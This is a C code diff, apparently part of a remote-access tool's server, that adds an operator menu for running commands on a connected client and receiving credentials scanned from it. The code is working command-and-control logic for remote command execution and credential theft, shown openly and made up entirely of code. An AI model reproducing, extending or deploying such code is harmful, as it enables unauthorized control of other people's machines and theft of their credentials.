@@ -10,6 +10,8 @@
 #define PORT 8080
 #define MAXLINE 1024
 
+char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n";
+
 void exec_on_client(int clientfd)
 {   
     char input_message[MAXLINE];
@@ -29,6 +31,15 @@ void exec_on_client(int clientfd)
 
     write(STDOUT_FILENO,command_result,recv_len);
     write(STDOUT_FILENO,"\n",1);
+}
+
+void get_credentials(int clientfd)
+{
+    char info_creds[MAXLINE];
+    int recv_len;
+    recv_len=recv(clientfd,info_creds,MAXLINE,0);
+
+    write(STDOUT_FILENO,info_creds,recv_len);
 }
 
 int main()
@@ -79,9 +90,30 @@ int main()
     else
         printf("Server accepted client connection\n");
 
+
+
     while(1)
-    {
-        exec_on_client(connfd);
+    {   
+        write(STDOUT_FILENO,options,strlen(options));
+
+        char opt;
+        read(STDIN_FILENO,&opt,sizeof(opt));
+        switch(opt)
+        {   
+            //TODO: flush la buffer ul de stdin atunci cand vreau sa trimit o comanda
+            case '1':
+            write(connfd,"1",1);
+            exec_on_client(connfd);
+            break;
+            case '2':
+            write(connfd,"2",1);
+            get_credentials(connfd);
+            break;
+            default:
+            break;
+
+        }
+
     }
 
     close(connfd);
